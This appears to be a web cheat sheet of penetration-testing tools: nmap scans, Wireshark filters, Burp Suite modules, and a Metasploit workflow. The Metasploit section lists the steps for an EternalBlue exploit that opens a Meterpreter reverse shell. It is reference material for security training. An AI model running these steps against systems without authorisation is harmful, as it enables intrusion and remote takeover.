nmap

Network discovery and security auditing. The gold standard for port scanning.

networkreconscanning

Essential Scans

nmap -sS TARGETSYN stealth scan (default for root) — fast, less detectable
nmap -sT TARGETTCP connect scan — works without root privileges
nmap -sU TARGETUDP scan — slower, but essential (DNS, SNMP, DHCP)
nmap -sV TARGETVersion detection — identify service versions
nmap -O TARGETOS fingerprinting — guess the target operating system
nmap -A TARGETAggressive scan — OS, version, script scanning, traceroute

Port Specification

nmap -p 22,80,443 TARGETScan specific ports
nmap -p 1-1000 TARGETScan port range
nmap -p- TARGETScan all 65535 ports
nmap --top-ports 100 TARGETScan top 100 most common ports

NSE Scripts

nmap --script=vuln TARGETRun all vulnerability detection scripts
nmap --script=http-enum TARGETEnumerate web directories and files
nmap --script=smb-os-discovery TARGETDiscover SMB/Samba OS information

Output

nmap -oN output.txt TARGETNormal output to file
nmap -oX output.xml TARGETXML output (parseable)
nmap -oG output.gnmap TARGETGrepable output

Wireshark / tshark

Network protocol analyzer. The microscope for network traffic.

networkanalysisforensics

Capture Filters (applied before capture)

host 192.168.1.1Traffic to/from a specific host
port 80Traffic on a specific port
tcpOnly TCP traffic
not arpExclude ARP traffic

Display Filters (applied after capture)

ip.addr == 192.168.1.1Filter by IP address
tcp.port == 443Filter by TCP port
http.requestShow only HTTP requests
dnsShow only DNS traffic
tcp.flags.syn == 1SYN packets only (connection starts)
frame contains "password"Search packet bytes for string
tcp.stream eq 5Follow a specific TCP stream

tshark (CLI)

tshark -r capture.pcapRead a capture file
tshark -r capture.pcap -Y "http"Apply display filter

Burp Suite

Web application security testing platform. The standard for web pentesting.

webproxytesting

Key Modules

Proxy > InterceptIntercept and modify HTTP requests in real-time
RepeaterResend individual requests, modify parameters, observe responses
IntruderAutomated fuzzing — brute force, parameter testing, enumeration
DecoderEncode/decode — URL, Base64, HTML entities, hex
ComparerCompare two requests/responses byte-by-byte

Quick Tips

Ctrl+RSend request to Repeater (from any tab)
Ctrl+ISend to Intruder
Proxy > Options > 127.0.0.1:8080Default proxy listener — set browser to this

Metasploit (msfconsole)

Exploitation framework. The Swiss Army knife of penetration testing.

exploitationframeworkpost-exploit

Basic Workflow

msfconsoleStart Metasploit
search TYPE:exploit NAME:smbSearch for exploits
use exploit/windows/smb/ms17_010_eternalblueSelect an exploit module
show optionsShow required settings
set RHOSTS 192.168.1.10Set target host
set LHOST 192.168.1.5Set your IP (for reverse shells)
set PAYLOAD windows/x64/meterpreter/reverse_tcpChoose payload
exploitRun the exploit

Meterpreter (post-exploit)

Linux CLI Essentials

Commands every security professional should know cold.

linuxclifundamentals
